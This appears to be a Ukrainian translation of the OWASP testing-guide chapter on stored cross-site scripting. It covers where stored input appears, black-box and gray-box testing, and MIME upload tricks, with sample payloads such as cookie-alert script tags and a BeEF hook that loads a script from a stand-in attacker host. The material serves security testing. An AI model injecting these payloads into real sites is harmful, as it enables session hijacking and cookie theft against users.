# Підсумок
[Збережений міжсайтовий сценарій (XSS)](https://owasp.org/www-community/attacks/xss/) є найнебезпечнішим типом міжсайтового сценарію. Веб-додатки, які дозволяють користувачам зберігати дані, потенційно піддаються такому типу атак. У цьому розділі наведено приклади впровадження збережених міжсайтових сценаріїв і відповідні сценарії використання.

Збережений XSS виникає, коли веб-програма збирає вхідні дані від користувача, які можуть бути зловмисними, а потім зберігає ці введені дані в сховищі даних для подальшого використання. Введені дані не відфільтровано належним чином. Як наслідок, шкідливі дані виглядатимуть як частина веб-сайту та запускатимуться в браузері користувача з правами веб-програми. Оскільки ця вразливість зазвичай стосується принаймні двох запитів до програми, її також можна назвати XSS другого порядку.

Цю вразливість можна використовувати для здійснення ряду атак на основі браузера, зокрема:

- Викрадення браузера іншого користувача
- Збирання конфіденційної інформації, яку переглядають користувачі програми
- Псевдопсування програми
- Сканування портів внутрішніх хостів («внутрішніх» по відношенню до користувачів веб-додатку)
- Спрямована доставка експлойтів на основі браузера
- Інші шкідливі дії

Для використання збереженого XSS не потрібне шкідливе посилання. Успішне використання відбувається, коли користувач відвідує сторінку зі збереженим XSS. Наступні етапи стосуються типового сценарію атаки XSS, що зберігається:

- Зловмисник зберігає шкідливий код на вразливій сторінці
- Користувач проходить автентифікацію в додатку
- Користувач відвідує вразливу сторінку
- Шкідливий код виконується браузером користувача

Цей тип атаки також можна використовувати за допомогою фреймворків використання браузера, таких як [BeEF](https://beefproject.com/) і [XSS Proxy](https://xss-proxy.sourceforge.net/). Ці фреймворки дозволяють розробляти складні JavaScript-експлойти.

Збережений XSS є особливо небезпечним у прикладних областях, до яких мають доступ користувачі з високими правами. Коли адміністратор відвідує вразливу сторінку, його браузер автоматично виконує атаку. Це може призвести до розкриття конфіденційної інформації, наприклад маркерів авторизації сеансу.

# Цілі тесту
- Визначити форми вводу, що зберігаються, котрі відображається на стороні клієнта.
- Оцінити вхідні дані, які вони приймають, і кодування, яке застосовується після повернення (якщо таке є).

# Як тестувати
## Тестування чорної скриньки
Процес виявлення збережених уразливостей XSS подібний до процесу, описаного під час [тестування відображеного XSS](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting).

### Форми вводу
Першим кроком є ​​визначення всіх точок, де дані користувача зберігаються у серверній частині, а потім відображаються програмою. Типові приклади збереженого вводу користувача можна знайти на:

- Сторінка користувача/профілів: програма дозволяє користувачеві редагувати/змінювати деталі профілю, такі як ім’я, прізвище, псевдонім, аватар, зображення, адреса тощо.
- Кошик для покупок: програма дозволяє користувачеві зберігати товари в кошику для покупок, які потім можна переглянути пізніше
- Файловий менеджер: програма, яка дозволяє завантажувати файли
- Параметри програми: програма, яка дозволяє користувачеві встановлювати параметри
- Форум/Дошка оголошень: програма, яка дозволяє обмінюватися повідомленнями між користувачами
- Блог: якщо програма блогу дозволяє користувачам надсилати коментарі
- Журнал: якщо програма зберігає деякі дані користувачів у журналах.

### Аналіз коду HTML
Вхідні дані, які зберігає програма, зазвичай використовуються в тегах HTML, але їх також можна знайти як частину вмісту JavaScript. На цьому етапі дуже важливо зрозуміти, чи зберігаються введені дані та як вони розташовані в контексті сторінки. На відміну від відображеного XSS, тестувальник також повинен досліджувати будь-які місця, через які програма отримує та зберігає дані користувачів.

**Примітка:** Усі області програми, до яких мають доступ адміністратори, слід перевірити на наявність будь-яких даних, наданих користувачами.

**Приклад:** Дані електроної пошти збережені в **index2.php**

![](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/images/Stored_input_example.jpg)
</br>*Рисунок 4.7.2-1: Приклад збереженої форми*

HTML-код index2.php, де знаходиться значення електронної пошти:

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com" />
```

У цьому випадку тестувальник повинен знайти спосіб вставити код поза тегом 
```html
<input>
```
, як показано нижче:

```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"> MALICIOUS CODE <!-- />
```

### Тестування для збережених XSS
Це включає в себе тестування перевірки вхідних даних і елементів керування фільтрацією програми. Основні приклади ін'єкцій у цьому випадку:

- aaa@aa.com&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;
- aaa@aa.com%22%3E%3Cscript%3Ealert(document.cookie)%3C%2Fscript%3E

Переконайтеся, що введені дані надіслано через додаток. Зазвичай це передбачає вимкнення JavaScript, якщо реалізовано засоби контролю безпеки на стороні клієнта, або зміну запиту HTTP за допомогою веб-проксі. Також важливо перевірити ту саму ін’єкцію як із запитами HTTP GET, так і POST. Вищевказане впровадження призводить до появи спливаючого вікна зі значеннями файлів cookie.

![](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/images/Stored_xss_example.jpg)
</br>*Рисунок 4.7.2-2: Приклад збереженої форми*

HTML-код після введення:
```html
<input class="inputbox" type="text" name="email" size="40" value="aaa@aa.com"><script>alert(document.cookie)</script>
```
Введені дані зберігаються, а навантаження XSS виконується браузером під час перезавантаження сторінки. Якщо вхідні дані екрануються програмою, тестувальники повинні перевірити програму на наявність фільтрів XSS. Наприклад, якщо рядок «SCRIPT» замінено пробілом або символом NULL, це може бути потенційною ознакою фільтрації XSS. Існує багато методів, щоб уникнути вхідних фільтрів (див. розділ «[Тестування відображеного XSS](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/01-Testing_for_Reflected_Cross_Site_Scripting)»). Тестувальникам наполегливо рекомендуємо звернутися до сторінок [XSS Filter Evasion](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) і [Mario](https://gchq.github.io/CyberChef/#input=V2lzaGluZyB5b3UgdGhlIGJlc3QgaW4geW91ciB3ZWJzZWN1cml0eSBqb3VybmV5IQ) XSS Cheat, на яких представлено розширений список XSS-атак і обходів фільтрації. Щоб отримати докладнішу інформацію, зверніться до розділу офіційних документів та інструментів.

### Використовуйте збережений XSS за допомогою BeEF
Збережені XSS можуть бути використані розширеними фреймворками JavaScript, такими як BeEF і XSS Proxy.

Типовий сценарій експлуатації BeEF передбачає:

- Впровадження перехоплювача JavaScript, який зв’язується з фреймворком використання браузера зловмисника (BeEF)
- Очікування, поки користувач програми перегляне вразливу сторінку, де відображаються збережені введення
- Керування браузером користувача програми через консоль BeEF

Перехоплення JavaScript можна впровадити, використовуючи вразливість XSS у веб-додатку.

**Приклад:** BeEF Injection в **index2.php**:
```html
aaa@aa.com"><script src=http://attackersite/hook.js></script>
```
Коли користувач завантажує сторінку **index2.php**, браузер виконує скрипт **hook.js**. Після цього можна отримати доступ до файлів cookie, знімка екрана користувача, буфера обміну користувача та запускати складні атаки XSS.

![](https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/images/RubyBeef.png)
</br>*Рисунок 4.7.2-3: Приклад ін’єкції BeEF*

Ця атака особливо ефективна на вразливих сторінках, які переглядають багато користувачів з різними привілеями.

### Завантаження файлів
Якщо веб-програма дозволяє завантажувати файли, важливо перевірити, чи можна завантажувати вміст HTML. Наприклад, якщо файли HTML або TXT дозволені, у завантажений файл можна додати корисне навантаження XSS. Тестувальник також повинен перевірити, чи дозволяє завантаження файлу встановлювати довільні типи MIME.

Розглянемо такий запит HTTP POST для завантаження файлу:
```http
POST /fileupload.aspx HTTP/1.1
[…]
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.txt"
Content-Type: text/plain

test
```

Цей недолік дизайну можна використати в атаках на неправильну обробку MIME браузера. Наприклад, такі нешкідливі на вигляд файли, як JPG і GIF, можуть містити навантаження XSS, яке виконується, коли вони завантажуються браузером. Це можливо, якщо замість типу MIME для зображення, наприклад **image/gif**, можна встановити **text/html**. У цьому випадку клієнтський браузер розглядатиме файл як HTML.

Підроблений запит HTTP POST:
```http
Content-Disposition: form-data; name="uploadfile1"; filename="C:\Documents and Settings\test\Desktop\test.gif"
Content-Type: text/html

<script>alert(document.cookie)</script>
```
Також врахуйте, що Internet Explorer не обробляє типи MIME так само, як Mozilla Firefox або інші браузери. Наприклад, Internet Explorer обробляє файли TXT із вмістом HTML як вміст HTML. Щоб отримати додаткову інформацію про обробку MIME, зверніться до розділу офіційних документів у кінці цього розділу.

## Тестування сірого ящика
Тестування сірого ящика схоже на тестування чорного ящика. У тестуванні сірого ящика тестувальник частково знає програму. У цьому випадку інформація про введення користувача, елементи керування перевіркою введення та зберігання даних може бути відома тестувальнику.

Залежно від доступної інформації тестувальникам зазвичай рекомендується перевіряти, як додаток обробляє введені користувачем дані, а потім зберігає їх у внутрішній системі. Рекомендовано зробити наступні кроки:

- Використати зовнішню програму та ввести дані за допомогою спеціальних/недійсних символів
- Аналізувати відповіді програми
- Визначити наявність елементів керування перевіркою введення
- Отримати доступ до внутрішньої системи та перевірити, чи зберігаються введені дані та як вони зберігаються
- Проаналізувати вихідний код і зрозуміти, як програма відображає збережені дані

Якщо вихідний код доступний (як у тестуванні білої скриньки), слід проаналізувати всі змінні, що використовуються у формах введення. Зокрема, такі мови програмування, як PHP, ASP і JSP, використовують попередньо визначені змінні/функції для зберігання вхідних даних із запитів HTTP GET і POST.

У наведеній нижче таблиці підсумовано деякі спеціальні змінні та функції, на які слід звернути увагу під час аналізу вихідного коду:

| PHP | ASP | JSP |
| :-- | :-- | :-- |
| $_GET - HTTP GET variables | Request.QueryString - HTTP GET | doGet, doPost servlets - HTTP GET and POST |
| **$_POST** - HTTP POST variables | **Request.Form** - HTTP POST | **request.getParameter** - HTTP GET/POST variables |
| $_REQUEST – HTTP POST, GET and COOKIE variables | Server.CreateObject - used to upload files |  | 
| **$_FILES** - HTTP File Upload variables |  |  | 

**Примітка:** У наведеній вище таблиці наведено лише підсумок найважливіших параметрів, але всі параметри, введені користувачем, повинні бути досліджені.